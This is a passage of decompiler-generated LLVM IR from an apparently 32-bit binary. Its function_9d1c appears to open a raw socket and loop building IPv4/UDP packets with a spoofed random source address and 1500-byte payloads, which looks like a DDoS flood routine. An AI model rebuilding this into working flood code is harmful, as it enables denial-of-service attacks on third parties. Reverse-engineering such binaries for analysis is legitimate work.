  %v9_98c8 = phi i32 [ %v3_9878, %dec_label_pc_986c ], [ %v3_9844, %dec_label_pc_9838 ], [ %v3_9820, %dec_label_pc_97dc ], [ %v3_98c0, %dec_label_pc_9880 ]
  ret i32 %v9_98c8

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg2, { 3, 2, 0, 1 }
  uselistorder i32 %arg1, { 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_98c4, { 3, 0, 1, 2 }
}

define i32 @function_98f0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_98f0:
  %stack_var_-4 = alloca i32, align 4
  store i32 39164, i32* %stack_var_-4, align 4
  %v2_98f8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_98f8, i32* @fp, align 4
  %v7_9914 = icmp eq i32 %arg3, 1
  br i1 %v7_9914, label %dec_label_pc_9968, label %dec_label_pc_991c

dec_label_pc_991c:                                ; preds = %dec_label_pc_98f0
  store i32 %arg2, i32* @r2, align 4
  %v3_9928 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([26 x i8]* @global_var_1605c.96 to i32))
  store i32 %arg2, i32* @r2, align 4
  %v3_9960 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([35 x i8]* @global_var_15fd0.86 to i32))
  br label %dec_label_pc_99e0

dec_label_pc_9968:                                ; preds = %dec_label_pc_98f0
  %v2_996c = load i8, i8* bitcast (i8** @global_var_2063c.23 to i8*), align 4
  %v2_9970 = icmp eq i8 %v2_996c, 0
  br i1 %v2_9970, label %dec_label_pc_9978, label %dec_label_pc_998c

dec_label_pc_9978:                                ; preds = %dec_label_pc_9968
  store i32 %arg2, i32* @r2, align 4
  %v3_9984 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_16078.102 to i32))
  br label %dec_label_pc_99e0

dec_label_pc_998c:                                ; preds = %dec_label_pc_9968
  %v1_9990 = add i32 %arg4, 4
  %v1_9994 = inttoptr i32 %v1_9990 to i32*
  %v2_9994 = load i32, i32* %v1_9994, align 4
  %v3_99a0 = call i32 @function_f464(i8* bitcast (i32* @global_var_22cb8.92 to i8*), i32 %v2_9994)
  %v2_99a8 = icmp eq i32 %v3_99a0, 0
  br i1 %v2_99a8, label %dec_label_pc_99c4, label %dec_label_pc_99b0

dec_label_pc_99b0:                                ; preds = %dec_label_pc_998c
  store i32 %arg2, i32* @r2, align 4
  %v3_99bc = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_16098.105 to i32))
  br label %dec_label_pc_99e0

dec_label_pc_99c4:                                ; preds = %dec_label_pc_998c
  store i8 0, i8* bitcast (i8** @global_var_2063c.23 to i8*), align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_99dc = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_160b4.107 to i32))
  br label %dec_label_pc_99e0

dec_label_pc_99e0:                                ; preds = %dec_label_pc_99b0, %dec_label_pc_9978, %dec_label_pc_991c, %dec_label_pc_99c4
  %v9_99e4 = phi i32 [ %v3_99bc, %dec_label_pc_99b0 ], [ %v3_9984, %dec_label_pc_9978 ], [ %v3_9960, %dec_label_pc_991c ], [ %v3_99dc, %dec_label_pc_99c4 ]
  ret i32 %v9_99e4

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* @global_var_22cb8.92, { 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_2063c.23 to i8*), { 0, 4, 1, 3, 2 }
  uselistorder i32 %arg2, { 3, 2, 4, 0, 1 }
  uselistorder i32 %arg1, { 3, 2, 4, 0, 1 }
  uselistorder label %dec_label_pc_99e0, { 3, 0, 1, 2 }
}

define i32 @function_9a0c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9a0c:
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_9a10 = load i32, i32* @r4, align 4
  store i32 %v3_9a10, i32* %stack_var_-20, align 4
  store i32 39448, i32* %stack_var_-4, align 4
  %v16_9a10 = ptrtoint i32* %stack_var_-20 to i32
  %v2_9a14 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9a14, i32* @fp, align 4
  store i32 %arg4, i32* %stack_var_-304, align 4
  %v7_9a30 = icmp eq i32 %arg3, 1
  br i1 %v7_9a30, label %dec_label_pc_9a64, label %dec_label_pc_9a38

dec_label_pc_9a38:                                ; preds = %dec_label_pc_9a0c
  store i32 %arg2, i32* @r2, align 4
  %v3_9a44 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([31 x i8]* @global_var_160d4.109 to i32))
  store i32 0, i32* bitcast (i8** @global_var_20640.33 to i32*), align 4
  store i32 0, i32* @global_var_20644.35, align 4
  br label %dec_label_pc_9c40

dec_label_pc_9a64:                                ; preds = %dec_label_pc_9a0c
  %v1_9a68 = add i32 %arg4, 4
  %v1_9a6c = inttoptr i32 %v1_9a68 to i32*
  %v2_9a6c = load i32, i32* %v1_9a6c, align 4
  store i32 %v2_9a6c, i32* @r0, align 4
  %v0_9a74 = call i32 @function_f030()
  %tmp = icmp ult i32 %v0_9a74, 17
  br i1 %tmp, label %dec_label_pc_9a98, label %dec_label_pc_9a84

dec_label_pc_9a84:                                ; preds = %dec_label_pc_9a64
  store i32 %arg2, i32* @r2, align 4
  %v3_9a90 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([75 x i8]* @global_var_160f4.113 to i32))
  br label %dec_label_pc_9c40

dec_label_pc_9a98:                                ; preds = %dec_label_pc_9a64
  %v3_9a98 = load i32, i32* %stack_var_-304, align 4
  %v1_9a9c = add i32 %v3_9a98, 4
  %v1_9aa0 = inttoptr i32 %v1_9a9c to i32*
  %v2_9aa0 = load i32, i32* %v1_9aa0, align 4
  %v2_9aa4 = ptrtoint i32* %stack_var_-288 to i32
  %v2_9ab0 = inttoptr i32 %v2_9aa0 to i8*
  %v3_9ab0 = call i32 @function_f090(i32 %v2_9aa4, i8* %v2_9ab0)
  store i32 %v2_9aa4, i32* @r0, align 4
  %v0_9abc = call i32 @function_f030()
  %v1_9ac4 = add i32 %v16_9a10, -1
  %v2_9ad4 = add i32 %v1_9ac4, %v0_9abc
  %v2_9ad8 = add i32 %v2_9ad4, -268
  %v1_9adc = inttoptr i32 %v2_9ad8 to i8*
  %v2_9adc = load i8, i8* %v1_9adc, align 1
  %v7_9ae0 = icmp eq i8 %v2_9adc, 46
  br i1 %v7_9ae0, label %dec_label_pc_9ae8, label %dec_label_pc_9b68

dec_label_pc_9ae8:                                ; preds = %dec_label_pc_9a98
  store i32 %v2_9aa4, i32* @r0, align 4
  %v0_9af0 = call i32 @function_f030()
  %v1_9af8 = add i32 %v16_9a10, -269
  %v2_9b0c = add i32 %v1_9af8, %v0_9af0
  %v3_9b14 = inttoptr i32 %v2_9b0c to i8*
  store i8 0, i8* %v3_9b14, align 1
  br label %dec_label_pc_9b68

dec_label_pc_9b2c:                                ; preds = %dec_label_pc_9b68
  %v2_9b3c = add i32 %stack_var_-32.0, %v16_9a10
  %v2_9b40 = add i32 %v2_9b3c, -268
  %v1_9b44 = inttoptr i32 %v2_9b40 to i8*
  %v2_9b44 = load i8, i8* %v1_9b44, align 1
  %v7_9b48 = icmp eq i8 %v2_9b44, 46
  br i1 %v7_9b48, label %dec_label_pc_9b50, label %dec_label_pc_9b5c

dec_label_pc_9b50:                                ; preds = %dec_label_pc_9b2c
  %v1_9b54 = add i32 %stack_var_-28.1, 1
  br label %dec_label_pc_9b5c

dec_label_pc_9b5c:                                ; preds = %dec_label_pc_9b2c, %dec_label_pc_9b50
  %stack_var_-28.0 = phi i32 [ %v1_9b54, %dec_label_pc_9b50 ], [ %stack_var_-28.1, %dec_label_pc_9b2c ]
  %v1_9b60 = add i32 %stack_var_-32.0, 1
  br label %dec_label_pc_9b68

dec_label_pc_9b68:                                ; preds = %dec_label_pc_9ae8, %dec_label_pc_9a98, %dec_label_pc_9b5c
  %stack_var_-28.1 = phi i32 [ %stack_var_-28.0, %dec_label_pc_9b5c ], [ 1, %dec_label_pc_9a98 ], [ 1, %dec_label_pc_9ae8 ]
  %stack_var_-32.0 = phi i32 [ %v1_9b60, %dec_label_pc_9b5c ], [ 0, %dec_label_pc_9a98 ], [ 0, %dec_label_pc_9ae8 ]
  store i32 %stack_var_-32.0, i32* @r4, align 4
  store i32 %v2_9aa4, i32* @r0, align 4
  %v0_9b74 = call i32 @function_f030()
  %v0_9b7c = load i32, i32* @r4, align 4
  %v3_9b7c = icmp ult i32 %v0_9b7c, %v0_9b74
  br i1 %v3_9b7c, label %dec_label_pc_9b2c, label %dec_label_pc_9b84

dec_label_pc_9b84:                                ; preds = %dec_label_pc_9b68
  %v1_9b88 = sub i32 4, %stack_var_-28.1
  %v3_9be022 = icmp eq i32 %v1_9b88, 0
  %v5_9be427 = icmp sgt i32 %v1_9b88, 0
  br i1 %v5_9be427, label %dec_label_pc_9b9c, label %dec_label_pc_9be8

dec_label_pc_9b9c:                                ; preds = %dec_label_pc_9b84, %dec_label_pc_9b9c
  %storemerge228 = phi i32 [ %v1_9bd0, %dec_label_pc_9b9c ], [ 0, %dec_label_pc_9b84 ]
  store i32 %v2_9aa4, i32* @r4, align 4
  store i32 %v2_9aa4, i32* @r0, align 4
  %v0_9ba8 = call i32 @function_f030()
  %v0_9bb0 = load i32, i32* @r4, align 4
  %v2_9bb0 = add i32 %v0_9bb0, %v0_9ba8
  store i32 %v2_9bb0, i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_16140.115 to i32), i32* @r1, align 4
  store i32 3, i32* @r2, align 4
  %v0_9bc8 = call i32 @function_ef60()
  %v1_9bd0 = add nuw nsw i32 %storemerge228, 1
  %v5_9be4 = icmp slt i32 %v1_9bd0, %v1_9b88
  br i1 %v5_9be4, label %dec_label_pc_9b9c, label %dec_label_pc_9be8

dec_label_pc_9be8:                                ; preds = %dec_label_pc_9b9c, %dec_label_pc_9b84
  %v1_9bf0 = bitcast i32* %stack_var_-288 to i8*
  %v2_9bf0 = call i32 @function_f618(i8* %v1_9bf0)
  br i1 %v3_9be022, label %dec_label_pc_9c34, label %dec_label_pc_9c18

dec_label_pc_9c18:                                ; preds = %dec_label_pc_9be8
  %v2_9c20 = call i32 @function_8c48(i32 256, i32 %v1_9b88)
  br label %dec_label_pc_9c34

dec_label_pc_9c34:                                ; preds = %dec_label_pc_9be8, %dec_label_pc_9c18
  %storemerge = phi i32 [ %v2_9c20, %dec_label_pc_9c18 ], [ 1, %dec_label_pc_9be8 ]
  %v12_9c447 = phi i32 [ %v2_9c20, %dec_label_pc_9c18 ], [ %v2_9bf0, %dec_label_pc_9be8 ]
  store i32 %storemerge, i32* @global_var_20644.35, align 4
  store i32 %v2_9bf0, i32* bitcast (i8** @global_var_20640.33 to i32*), align 4
  br label %dec_label_pc_9c40

dec_label_pc_9c40:                                ; preds = %dec_label_pc_9a84, %dec_label_pc_9a38, %dec_label_pc_9c34
  %v12_9c44 = phi i32 [ %v3_9a90, %dec_label_pc_9a84 ], [ %v3_9a44, %dec_label_pc_9a38 ], [ %v12_9c447, %dec_label_pc_9c34 ]
  ret i32 %v12_9c44

; uselistorder directives
  uselistorder i32 %v2_9bf0, { 1, 0 }
  uselistorder i32 %v1_9bd0, { 1, 0 }
  uselistorder i32 %v1_9b88, { 2, 3, 0, 1 }
  uselistorder i32 %stack_var_-32.0, { 2, 0, 1 }
  uselistorder i32 %stack_var_-28.1, { 0, 2, 1 }
  uselistorder i32 %v16_9a10, { 0, 2, 1 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_8c48, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9c40, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9c34, { 1, 0 }
  uselistorder label %dec_label_pc_9b9c, { 1, 0 }
  uselistorder label %dec_label_pc_9b68, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9b5c, { 1, 0 }
}

define i32 @function_9c5c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_9c5c:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_9c60 = load i32, i32* @fp, align 4
  store i32 40040, i32* %stack_var_-4, align 4
  %v2_9c64 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9c64, i32* @fp, align 4
  store i32 %arg2, i32* %stack_var_-28, align 4
  store i32 %arg2, i32* @r0, align 4
  %v1_9c78 = call i32 @function_f730(i32 %arg2)
  store i32 %v1_9c78, i32* @global_var_20a4c.117, align 4
  %v3_9c90 = icmp eq i32 %v1_9c78, -1
  br i1 %v3_9c90, label %dec_label_pc_9c98, label %dec_label_pc_9cfc

dec_label_pc_9c98:                                ; preds = %dec_label_pc_9c5c
  %v3_9c98 = load i32, i32* %stack_var_-28, align 4
  %v1_9c9c = call i32 @function_f754(i32 %v3_9c98)
  %v2_9cac = icmp eq i32 %v1_9c9c, 0
  br i1 %v2_9cac, label %dec_label_pc_9cb4, label %dec_label_pc_9cd8

dec_label_pc_9cb4:                                ; preds = %dec_label_pc_9c98
  %v2_9cb8 = load i32, i32* @global_var_22dc0.25, align 4
  store i32 %arg1, i32* @r2, align 4
  %v3_9ccc = call i32 @function_8374(i32 %v2_9cb8, i32 ptrtoint ([33 x i8]* @global_var_16144.120 to i32))
  %v1_9cd4 = call i32 @function_10a14(i32 0)
  br label %dec_label_pc_9cd8

dec_label_pc_9cd8:                                ; preds = %dec_label_pc_9c98, %dec_label_pc_9cb4
  %v1_9cdc = add i32 %v1_9c9c, 16
  %v2_9cdc = inttoptr i32 %v1_9cdc to i32*
  %v3_9cdc = load i32, i32* %v2_9cdc, align 4
  %v1_9ce0 = inttoptr i32 %v3_9cdc to i32*
  %v2_9ce0 = load i32, i32* %v1_9ce0, align 4
  %v1_9cec = add i32 %v1_9c9c, 12
  %v2_9cec = inttoptr i32 %v1_9cec to i32*
  %v3_9cec = load i32, i32* %v2_9cec, align 4
  store i32 %v3_9cec, i32* @r2, align 4
  %v3_9cf8 = call i32 @function_ef50(i32 %v2_9ce0, i32 ptrtoint (i32* @global_var_20a4c.117 to i32), i32 %v3_9cec)
  %v2_9d00.pre = load i32, i32* @global_var_20a4c.117, align 4
  br label %dec_label_pc_9cfc

dec_label_pc_9cfc:                                ; preds = %dec_label_pc_9c5c, %dec_label_pc_9cd8
  %v2_9d00 = phi i32 [ %v1_9c78, %dec_label_pc_9c5c ], [ %v2_9d00.pre, %dec_label_pc_9cd8 ]
  store i32 %v3_9c60, i32* @fp, align 4
  ret i32 %v2_9d00

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* @global_var_20a4c.117, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9cfc, { 1, 0 }
  uselistorder label %dec_label_pc_9cd8, { 1, 0 }
}

define i32 @function_9d1c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9d1c:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp13 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-1544 = alloca i32, align 4
  %stack_var_-1552 = alloca i32, align 4
  %stack_var_-1572 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 40232, i32* %stack_var_-4, align 4
  %v2_9d24 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9d24, i32* @fp, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_9d4c = call i32 @function_ce30(i32* null)
  store i32 %v2_9d4c, i32* %r3.global-to-local, align 4
  %v1_9d5c = call i32 @function_83d8(i32 %arg2)
  store i32 %v1_9d5c, i32* %r3.global-to-local, align 4
  %v2_9d64 = icmp eq i32 %v1_9d5c, 0
  br i1 %v2_9d64, label %dec_label_pc_9d6c, label %dec_label_pc_a100

dec_label_pc_9d6c:                                ; preds = %dec_label_pc_9d1c
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 255, i32* %r2.global-to-local, align 4
  %v3_9d78 = call i32 @function_fc4c(i32 2, i32 3, i32 255)
  store i32 %v3_9d78, i32* %r3.global-to-local, align 4
  %v1_9d88 = icmp slt i32 %v3_9d78, 0
  br i1 %v1_9d88, label %dec_label_pc_9d90, label %dec_label_pc_9d98

dec_label_pc_9d90:                                ; preds = %dec_label_pc_9d6c
  %v1_9d94 = call i32 @function_10a14(i32 1)
  br label %dec_label_pc_9d98

dec_label_pc_9d98:                                ; preds = %dec_label_pc_9d6c, %dec_label_pc_9d90
  store i32 %arg3, i32* %r3.global-to-local, align 4
  %v8_9da0 = icmp sgt i32 %arg3, 2
  br i1 %v8_9da0, label %dec_label_pc_9dbc, label %dec_label_pc_9da4

dec_label_pc_9da4:                                ; preds = %dec_label_pc_9d98
  store i32 ptrtoint ([39 x i8]* @global_var_16168.122 to i32), i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_9db0 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_16168.122 to i32))
  %v1_9db8 = call i32 @function_10a14(i32 1)
  br label %dec_label_pc_9dbc

dec_label_pc_9dbc:                                ; preds = %dec_label_pc_9d98, %dec_label_pc_9da4
  %v1_9dc0 = add i32 %arg4, 4
  store i32 %v1_9dc0, i32* %r3.global-to-local, align 4
  %v1_9dc4 = inttoptr i32 %v1_9dc0 to i32*
  %v2_9dc4 = load i32, i32* %v1_9dc4, align 4
  store i32 %v2_9dc4, i32* %r3.global-to-local, align 4
  store i32 %v2_9dc4, i32* %r1.global-to-local, align 4
  %v2_9dd0 = call i32 @function_9c5c(i32 %arg2, i32 %v2_9dc4)
  %v1_9de0 = add i32 %arg4, 8
  store i32 %v1_9de0, i32* %r3.global-to-local, align 4
  %v1_9de4 = inttoptr i32 %v1_9de0 to i32*
  %v2_9de4 = load i32, i32* %v1_9de4, align 4
  store i32 %v2_9de4, i32* %r3.global-to-local, align 4
  %v1_9dec = inttoptr i32 %v2_9de4 to i8*
  %v2_9dec = call i32 @function_10868(i8* %v1_9dec)
  %v1_9dfc = add i32 %arg4, 12
  store i32 %v1_9dfc, i32* %r3.global-to-local, align 4
  %v1_9e00 = inttoptr i32 %v1_9dfc to i32*
  %v2_9e00 = load i32, i32* %v1_9e00, align 4
  store i32 %v2_9e00, i32* %r3.global-to-local, align 4
  %v1_9e08 = inttoptr i32 %v2_9e00 to i8*
  %v2_9e08 = call i32 @function_10868(i8* %v1_9e08)
  %v2_9e1c = ptrtoint i32* %stack_var_-1572 to i32
  %tmp42 = bitcast i32* %stack_var_-1572 to i8*
  %tmp43 = bitcast i32* %stack_var_-1552 to i8*
  %v2_9e44 = ptrtoint i32* %stack_var_-1544 to i32
  store i32 %v2_9e44, i32* %r3.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  store i32 1472, i32* @r2, align 4
  %v2_9e58 = bitcast i32* %stack_var_-1544 to i8*
  %v3_9e58 = call i32 @function_ef70(i8* %v2_9e58, i32 10)
  store i32 %v1_9dc0, i32* %r3.global-to-local, align 4
  %v2_9e64 = load i32, i32* %v1_9dc4, align 4
  store i32 %v2_9e64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([26 x i8]* @global_var_16190.124 to i32), i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_9e74 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([26 x i8]* @global_var_16190.124 to i32))
  store i8 69, i8* %tmp42, align 4
  %v3_9ec8 = or i32 %v2_9e1c, 1
  %v4_9ec8 = inttoptr i32 %v3_9ec8 to i8*
  store i8 0, i8* %v4_9ec8, align 1
  store i32 %v2_9e1c, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v3_9ed8 = or i32 %v2_9e1c, 2
  %v4_9ed8 = inttoptr i32 %v3_9ed8 to i8*
  store i8 -36, i8* %v4_9ed8, align 2
  %v0_9edc = load i32, i32* %r2.global-to-local, align 4
  %v1_9edc = trunc i32 %v0_9edc to i8
  %v2_9edc = load i32, i32* %r1.global-to-local, align 4
  %v3_9edc = add i32 %v2_9edc, 3
  %v4_9edc = inttoptr i32 %v3_9edc to i8*
  store i8 %v1_9edc, i8* %v4_9edc, align 1
  store i32 %v2_9e1c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_9ee8 = add i32 %v2_9e1c, 6
  %v4_9ee8 = inttoptr i32 %v3_9ee8 to i8*
  store i8 0, i8* %v4_9ee8, align 2
  %v0_9eec = load i32, i32* %r3.global-to-local, align 4
  %v1_9eec = trunc i32 %v0_9eec to i8
  %v2_9eec = load i32, i32* %r2.global-to-local, align 4
  %v3_9eec = add i32 %v2_9eec, 7
  %v4_9eec = inttoptr i32 %v3_9eec to i8*
  store i8 %v1_9eec, i8* %v4_9eec, align 1
  %v3_9ef8 = add i32 %v2_9e1c, 9
  %v4_9ef8 = inttoptr i32 %v3_9ef8 to i8*
  store i8 17, i8* %v4_9ef8, align 1
  %v3_9f04 = add i32 %v2_9e1c, 8
  %v4_9f04 = inttoptr i32 %v3_9f04 to i8*
  store i8 64, i8* %v4_9f04, align 4
  store i32 %v2_9e1c, i32* %r2.global-to-local, align 4
  %v2_9f10 = add i32 %v2_9e1c, 16
  %v3_9f10 = inttoptr i32 %v2_9f10 to i32*
  store i32 %v2_9dd0, i32* %v3_9f10, align 4
  %v3_9f1c = urem i32 %tmp13, 65536
  store i32 %v3_9f1c, i32* %r3.global-to-local, align 4
  %v1_9f24 = call i32 @function_f604(i32 %v3_9f1c)
  %sext = mul i32 %v1_9f24, 16777216
  %v1_9f28 = sdiv i32 %sext, 16777216
  store i32 %v1_9f28, i32* %r3.global-to-local, align 4
  %v4_9f2c = ptrtoint i32* %stack_var_-1552 to i32
  store i32 %v4_9f2c, i32* %r2.global-to-local, align 4
  %v1_9f30 = trunc i32 %v1_9f28 to i8
  %v3_9f30 = add i32 %v4_9f2c, 4
  %v4_9f30 = inttoptr i32 %v3_9f30 to i8*
  store i8 %v1_9f30, i8* %v4_9f30, align 4
  %v0_9f34 = load i32, i32* %r3.global-to-local, align 4
  %v3_9f347 = udiv i32 %v0_9f34, 256
  %v1_9f38 = trunc i32 %v3_9f347 to i8
  %v2_9f38 = load i32, i32* %r2.global-to-local, align 4
  %v3_9f38 = add i32 %v2_9f38, 5
  %v4_9f38 = inttoptr i32 %v3_9f38 to i8*
  store i8 %v1_9f38, i8* %v4_9f38, align 1
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-72, align 4
  %v2_9f78 = icmp eq i32 %v2_9dec, 0
  %v3_9fc0 = or i32 %v4_9f2c, 2
  %v4_9fc0 = inttoptr i32 %v3_9fc0 to i8*
  %v3_9ff0 = add i32 %v4_9f2c, 6
  %v4_9ff0 = inttoptr i32 %v3_9ff0 to i8*
  %v2_a008 = add i32 %v2_9e1c, 12
  %v3_a008 = inttoptr i32 %v2_a008 to i32*
  %v3_a020 = add i32 %v2_9e1c, 4
  %v4_a020 = inttoptr i32 %v3_a020 to i8*
  %v3_a050 = add i32 %v2_9e1c, 10
  %v4_a050 = inttoptr i32 %v3_a050 to i8*
  %v2_a07c = ptrtoint i32* %stack_var_-72 to i32
  %v2_a0d4 = add i32 %v2_9e08, %v2_9d4c
  %v3_9f88 = urem i32 %v2_9dec, 65536
  %v3_9f70 = or i32 %v4_9f2c, 1
  %v4_9f70 = inttoptr i32 %v3_9f70 to i8*
  br label %dec_label_pc_9f54

dec_label_pc_9f54:                                ; preds = %dec_label_pc_a0f0, %dec_label_pc_9dbc
  %storemerge = phi i32 [ %v2_9dd0, %dec_label_pc_9dbc ], [ %v1_a0f4, %dec_label_pc_a0f0 ]
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_9dbc ], [ %v1_a0f4, %dec_label_pc_a0f0 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v0_9f54 = call i32 @function_10364()
  store i32 %v4_9f2c, i32* %r2.global-to-local, align 4
  %v1_9f68 = trunc i32 %v0_9f54 to i8
  store i8 %v1_9f68, i8* %tmp43, align 4
  %v3_9f60 = udiv i32 %v0_9f54, 256
  %v1_9f70 = trunc i32 %v3_9f60 to i8
  store i8 %v1_9f70, i8* %v4_9f70, align 1
  store i32 %v2_9dec, i32* %r3.global-to-local, align 4
  br i1 %v2_9f78, label %dec_label_pc_9fac, label %dec_label_pc_9f80

dec_label_pc_9f80:                                ; preds = %dec_label_pc_9f54
  store i32 %v3_9f88, i32* %r3.global-to-local, align 4
  %v1_9f90 = call i32 @function_f604(i32 %v3_9f88)
  %sext3 = mul i32 %v1_9f90, 16777216
  %v1_9f94 = sdiv i32 %sext3, 16777216
  store i32 %v1_9f94, i32* %r3.global-to-local, align 4
  store i32 %v4_9f2c, i32* %r2.global-to-local, align 4
  %v1_9f9c = trunc i32 %v1_9f94 to i8
  store i8 %v1_9f9c, i8* %v4_9fc0, align 2
  %v0_9fa0 = load i32, i32* %r3.global-to-local, align 4
  %v3_9fa0 = sdiv i32 %v0_9fa0, 256
  store i32 %v3_9fa0, i32* %r3.global-to-local, align 4
  %v1_9fa4 = trunc i32 %v3_9fa0 to i8
  %v2_9fa4 = load i32, i32* %r2.global-to-local, align 4
  %v3_9fa4 = add i32 %v2_9fa4, 3
  %v4_9fa4 = inttoptr i32 %v3_9fa4 to i8*
  store i8 %v1_9fa4, i8* %v4_9fa4, align 1
  br label %dec_label_pc_9fcc

dec_label_pc_9fac:                                ; preds = %dec_label_pc_9f54
  %v0_9fac = call i32 @function_10364()
  %v3_9fb8 = urem i32 %v0_9fac, 65536
  store i32 %v3_9fb8, i32* %r3.global-to-local, align 4
  store i32 %v4_9f2c, i32* %r2.global-to-local, align 4
  %v1_9fc0 = trunc i32 %v0_9fac to i8
  store i8 %v1_9fc0, i8* %v4_9fc0, align 2
  %v0_9fc4 = load i32, i32* %r3.global-to-local, align 4
  %v3_9fc4 = sdiv i32 %v0_9fc4, 256
  store i32 %v3_9fc4, i32* %r3.global-to-local, align 4
  %v1_9fc8 = trunc i32 %v3_9fc4 to i8
  %v2_9fc8 = load i32, i32* %r2.global-to-local, align 4
  %v3_9fc8 = add i32 %v2_9fc8, 3
  %v4_9fc8 = inttoptr i32 %v3_9fc8 to i8*
  store i8 %v1_9fc8, i8* %v4_9fc8, align 1
  br label %dec_label_pc_9fcc

dec_label_pc_9fcc:                                ; preds = %dec_label_pc_9f80, %dec_label_pc_9fac
  store i32 %v2_9e1c, i32* %r3.global-to-local, align 4
  store i32 1500, i32* %r1.global-to-local, align 4
  %v3_9fe4 = call i32 @function_8cc4(i8* %tmp42, i32 1500)
  %sext4 = mul i32 %v3_9fe4, 16777216
  %v1_9fe8 = sdiv i32 %sext4, 16777216
  store i32 %v1_9fe8, i32* %r3.global-to-local, align 4
  store i32 %v4_9f2c, i32* %r2.global-to-local, align 4
  %v1_9ff0 = trunc i32 %v1_9fe8 to i8
  store i8 %v1_9ff0, i8* %v4_9ff0, align 2
  %v0_9ff4 = load i32, i32* %r3.global-to-local, align 4
  %v3_9ff4 = sdiv i32 %v0_9ff4, 256
  store i32 %v3_9ff4, i32* %r3.global-to-local, align 4
  %v1_9ff8 = trunc i32 %v3_9ff4 to i8
  %v2_9ff8 = load i32, i32* %r2.global-to-local, align 4
  %v3_9ff8 = add i32 %v2_9ff8, 7
  %v4_9ff8 = inttoptr i32 %v3_9ff8 to i8*
  store i8 %v1_9ff8, i8* %v4_9ff8, align 1
  %v0_9ffc = call i32 @function_8548()
  store i32 %v0_9ffc, i32* %r2.global-to-local, align 4
  store i32 %v2_9e1c, i32* %r3.global-to-local, align 4
  store i32 %v0_9ffc, i32* %v3_a008, align 4
  %v0_a00c = call i32 @function_10364()
  %v3_a018 = urem i32 %v0_a00c, 65536
  store i32 %v3_a018, i32* %r3.global-to-local, align 4
  store i32 %v2_9e1c, i32* %r2.global-to-local, align 4
  %v1_a020 = trunc i32 %v0_a00c to i8
  store i8 %v1_a020, i8* %v4_a020, align 4
  %v0_a024 = load i32, i32* %r3.global-to-local, align 4
  %v3_a0248 = udiv i32 %v0_a024, 256
  %v1_a028 = trunc i32 %v3_a0248 to i8
  %v2_a028 = load i32, i32* %r2.global-to-local, align 4
  %v3_a028 = add i32 %v2_a028, 5
  %v4_a028 = inttoptr i32 %v3_a028 to i8*
  store i8 %v1_a028, i8* %v4_a028, align 1
  store i32 %v2_9e1c, i32* %r3.global-to-local, align 4
  store i32 1500, i32* %r1.global-to-local, align 4
  %v3_a044 = call i32 @function_8cc4(i8* %tmp42, i32 1500)
  %sext5 = mul i32 %v3_a044, 16777216
  %v1_a048 = sdiv i32 %sext5, 16777216
  store i32 %v1_a048, i32* %r3.global-to-local, align 4
  store i32 %v2_9e1c, i32* %r2.global-to-local, align 4
  %v1_a050 = trunc i32 %v1_a048 to i8
  store i8 %v1_a050, i8* %v4_a050, align 2
